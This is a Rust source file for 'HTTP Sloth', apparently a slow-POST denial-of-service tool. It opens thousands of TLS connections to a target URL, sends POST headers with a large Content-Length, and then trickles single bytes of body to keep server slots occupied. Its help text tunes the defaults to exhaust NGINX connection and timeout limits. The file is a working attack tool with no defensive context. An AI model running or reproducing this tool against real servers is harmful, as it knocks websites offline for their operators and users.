use std::net::ToSocketAddrs;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;

#[macro_use]
extern crate clap;
use clap::{App, Arg};

extern crate tokio;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::timer::Interval;

extern crate tokio_rustls;
use tokio_rustls::{rustls::ClientConfig, webpki::DNSNameRef, TlsConnector};

extern crate url;
use url::Url;

#[tokio::main]
async fn main() {
    let arguments = App::new("HTTP Sloth")
        .arg(Arg::with_name("url")
             .long("url")
             .value_name("URL")
             .help("Target URL.")
             .required(true))
        .arg(Arg::with_name("content-length")
             .long("content-length")
             .value_name("BYTES")
             .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
        .arg(Arg::with_name("interval")
             .value_name("SECONDS")
             .long("interval")
             .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
        .arg(Arg::with_name("max-connections")
             .value_name("INTEGER")
             .long("max-connections")
             .help("Higher cap for simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
        .get_matches();

    let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
    // let scheme = parsed_url.scheme().to_owned();
    let host = parsed_url.host_str().unwrap().to_owned();
    let path = parsed_url.path();
    let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
    let tick = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
    let max_connections_count: usize =
        value_t!(arguments, "max-connections", usize).unwrap_or(8192);
    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
    let body_portion = "a";
    let addr = format!(
        "{}:{}",
        parsed_url.host_str().unwrap(),
        parsed_url.port_or_known_default().unwrap().to_string()
    )
    .to_socket_addrs()
    .unwrap()
    .next()
    .unwrap();

    let mut config = ClientConfig::new();
    config
        .root_store
        .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);
    let tls_connector = TlsConnector::from(Arc::new(config));

    let live_connections = Arc::new(AtomicUsize::new(0));
    let mut interval = Interval::new_interval(Duration::from_secs(1));

    {
        let live_connections = Arc::clone(&live_connections);
        tokio::spawn(async move {
            interval.next().await;
            println!(
                "Live Connections: {}",
                live_connections.load(Ordering::SeqCst)
            );
        });
    }

    let sleep = std::time::Duration::from_millis(10);
    loop {
        let live_connections = Arc::clone(&live_connections);
        if live_connections.load(Ordering::SeqCst) >= max_connections_count {
            std::thread::sleep(sleep);
            continue;
        }

        let connection_number = live_connections.fetch_add(1, Ordering::SeqCst) + 1;
        let host = host.clone();
        let start = start.clone();
        let tls_connector = tls_connector.clone();

        tokio::spawn(async move {
            let socket = TcpStream::connect(&addr);
            let dnsname = DNSNameRef::try_from_ascii_str(&host)
                .map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    format!(
                        "ERROR: DNSNameRef await: Connection number: {}: {}",
                        connection_number, e
                    );
                })
                .unwrap();
            let socket = socket
                .await
                .map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    format!(
                        "ERROR: Socket await: Connection number: {}: {}",
                        connection_number, e
                    );
                })
                .unwrap();
            let mut connector = tls_connector
                .connect(dnsname, socket)
                .await
                .map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    format!(
                        "ERROR: Connector connect await: Connection number: {}: {}",
                        connection_number, e
                    );
                })
                .unwrap();

            // Write start
            AsyncWriteExt::write(&mut connector, start.as_bytes())
                .await
                .unwrap();
            AsyncWriteExt::flush(&mut connector).await.unwrap();
            let mut interval = Interval::new_interval(tick);
            tokio::spawn(async move {
                interval.next().await;
                // Write small piece of body
                AsyncWriteExt::write(&mut connector, body_portion.as_bytes())
                    .await
                    .unwrap();
                AsyncWriteExt::flush(&mut connector).await.unwrap();
            });
        });
    }
}
